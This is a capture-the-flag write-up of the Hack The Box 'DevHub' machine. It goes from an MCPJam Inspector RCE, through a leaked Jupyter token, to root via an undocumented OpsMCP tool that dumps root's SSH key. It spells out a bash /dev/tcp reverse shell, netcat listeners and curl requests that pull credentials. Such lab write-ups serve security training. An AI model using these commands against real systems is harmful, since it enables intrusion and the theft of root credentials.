---
layout: post
title: "HTB DevHub — From Exposed MCP Server to Root"
date: 2026-09-16 12:00:00 +0000
description: A walkthrough of the Hack The Box "DevHub" machine — from an unauthenticated RCE in an exposed MCPJam Inspector instance, through Jupyter-based lateral movement, to root via a custom internal OpsMCP server.
tags: [htb, writeup, cybersecurity, linux, mcp]
categories: writeups
related_posts: false
---

**Machine:** DevHub (Hack The Box, Season 11) — Medium, Linux
**Author:** Do0m / ppporrkkky — [HTB profile](https://profile.hackthebox.com/profile/019c56c9-a8f8-721d-ad7b-fd7b3dd2f9de)

## Recon

Starting an Nmap scan against the target reveals three interesting ports:

```
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp   open  http     nginx 1.18.0 (Ubuntu)
6274/tcp open  unknown  (fingerprinted as an MCPJam Inspector instance)
```

Port 80 hosts a page describing **DevHub**, an internal "Development & Analytics Platform" listing three services:

- **MCP Inspector** — a Model Context Protocol development/debugging tool, active on port 6274
- **Analytics Dashboard** — a Jupyter-based analytics environment, marked "internal only" on `localhost:8888`
- **Code Repository** — an internal Git server, currently in maintenance mode

The Jupyter service on `localhost:8888` isn't reachable from outside, but it's worth keeping in mind — it's running somewhere on the box, which usually means it's reachable *from* the box itself.

## Initial Foothold: RCE in MCPJam Inspector

Port 6274 responds to HTTP with a page identifying itself as **MCPJam Inspector**. Checking its version in Settings shows **v1.4.2**.

A quick search turns up a critical, GitHub-reviewed advisory for exactly this package:

> **[GHSA-232v-j27c-5pp6](https://github.com/advisories/GHSA-232v-j27c-5pp6)** — Remote Code Execution in MCPJam Inspector due to an exposed HTTP endpoint. Affected: `@mcpjam/inspector <= 1.4.2`. Patched in `1.4.3`.

We're squarely in the vulnerable version range. The advisory's PoC shows that a crafted HTTP request to the inspector's `/api/mcp/connect` endpoint can execute arbitrary commands by supplying a malicious `serverConfig`. Adapting a Python PoC for this target ([exploit-db #52625](https://www.exploit-db.com/exploits/52625)), and pointing it at a reverse shell payload instead of a calculator, gives us code execution.

Setting up a listener first:

```bash
nc -lvnp 9000
```

Then firing the adapted exploit against the target's MCP endpoint returns a connection — we land as a low-privileged user.

## Shell Stabilization

A raw reverse shell like this is fragile — no job control, no `Ctrl+C`, no tab-completion. Standard three-step stabilization:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background it (`Ctrl+Z`), then locally:

```bash
stty raw -echo; fg
```

Press `Enter` twice, then inside the remote shell:

```bash
export TERM=xterm
```

This gives working `Ctrl+C`, arrow keys, and interactive tools like `vim` or `less`. (A `rlwrap nc -lvnp <port>` listener from the start avoids most of this hassle.)

## Enumeration: Finding the Lateral Move

Running `linpeas.sh` on the box surfaces the running process list. Two lines stand out:

```
manalyst  ... /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab
          --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks
          --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password=
          --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
```

The `analyst` user's Jupyter server is running with its **auth token hardcoded on the command line** — visible to anyone who can read the process list. That's the internal `localhost:8888` service the landing page mentioned. This is a direct path to a shell as `analyst`.

Also worth noting from the process list: a **root cron job** repeatedly launching a Python interpreter against a script — a strong hint that privilege escalation lives somewhere in that direction too, once we're past `analyst`.

## Lateral Movement via Jupyter's Terminal API

Jupyter exposes a terminal API that, with a valid token, lets you spawn and interact with a real shell on the box — exactly what we need.

**Create a terminal session:**

```bash
curl -X POST 'http://127.0.0.1:8888/api/terminals' \
  -H 'Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7' \
  -H 'Content-Type: application/json' \
  -d '{"cwd":""}' \
  -i
```

The response gives a terminal ID (`"name": "1"`). Commands to that terminal go over a **WebSocket**, so we need a WebSocket client — [`websocat`](https://github.com/vi/websocat) does the job:

```bash
./websocat.x86_64-unknown-linux-musl \
  "ws://127.0.0.1:8888/terminals/websocket/1?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

Sending a command as a JSON `stdin` frame confirms the session belongs to `analyst`:

```bash
echo '["stdin", "ls -la\r"]' | ./websocat.x86_64-unknown-linux-musl \
  "ws://127.0.0.1:8888/terminals/websocket/1?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

From here, popping a proper reverse shell as `analyst` is straightforward — start a listener, then send the payload the same way:

```bash
nc -lvnp 9000
```

```bash
echo '["stdin", "bash -i >& /dev/tcp/10.10.14.90/9000 0>&1\r"]' | \
  ./websocat.x86_64-unknown-linux-musl \
  "ws://127.0.0.1:8888/terminals/websocket/1?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

Stabilize the same way as before. `user.txt` is sitting right in `analyst`'s home directory.

## Escalation: The OpsMCP Server

While poking around `analyst`'s home, a hidden file stands out: `.opsmcp_key`, containing what looks like an API key:

```
opsmcp_secret_key_4f5a6b7c8d9e0f1a
```

Cross-referencing with linpeas' earlier output — the root cron job running `/opt/opsmcp/server.py` via `analyst`'s own Python interpreter — the connection is obvious: this key almost certainly authenticates against that root-owned service.

`server.py` is readable (owned by `analyst`). It reveals a small Flask app: **OpsMCP**, an MCP server exposing system-operations tools to an LLM client, listening on `127.0.0.1:5000` — and, since the cron job runs it as **root**, any tool it exposes runs with root privileges.

The same secret key found on disk is hardcoded in the source as the API key:

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

Probing the API confirms it's live and listing available tools:

```bash
curl 127.0.0.1:5000/tools/list -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

```json
{"count":4,"tools":["ops.system_status","ops.list_services","ops.check_disk","ops.view_logs"]}
```

None of the four *advertised* tools are directly useful — but reading further into `server.py`'s source turns up an **undocumented** handler, not listed by `/tools/list`:

```python
elif tool_name == "ops._admin_dump":
    target = args.get('target', '')
    confirm = args.get('confirm', False)
    ...
    if target == "ssh_keys":
        with open('/root/.ssh/id_rsa', 'r') as f:
            key_data = f.read()
        return jsonify({"target": "ssh_keys", "root_private_key": key_data, ...})
```

An unlisted endpoint that, given `target=ssh_keys` and `confirm=true`, dumps root's private SSH key straight into the response. Calling it directly:

```bash
curl -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{
    "name": "ops._admin_dump",
    "arguments": {
      "target": "ssh_keys",
      "confirm": true
    }
  }'
```

...returns the full root private key in the JSON response.

## Root

The key comes back with escaped `\n` sequences and stray whitespace baked into the JSON string — pasting it straight into a file won't produce a valid PEM. A short sanitization script (strip escaped newlines, normalize to Unix line endings, trim trailing artifacts, then `chmod 400`) cleans it up into a usable private key file.

From there:

```bash
ssh -i enigma_root_key root@10.129.245.216
```

Drops straight into a root shell — `root.txt` confirms full compromise of the box.

## Takeaways

- **A dev/debug tool exposed to the internet is a liability.** MCPJam Inspector had no business being reachable from outside in the first place — the initial foothold came entirely from a known, patched CVE that a version bump would have closed.
- **Secrets on the command line are secrets anyone can read.** The Jupyter auth token was visible in plaintext to any process listing — token-based auth means little if the token itself is exposed that easily.
- **"Internal" tools still need scrutiny.** OpsMCP was root-owned and meant for internal system operations, but shipped an undocumented, unauthenticated-by-design admin backdoor (`ops._admin_dump`) that dumps credentials on request. Exposing powerful automation to an LLM (or anything else) demands the same rigor as any other privileged interface — every reachable code path matters, not just the ones in the public tool list.
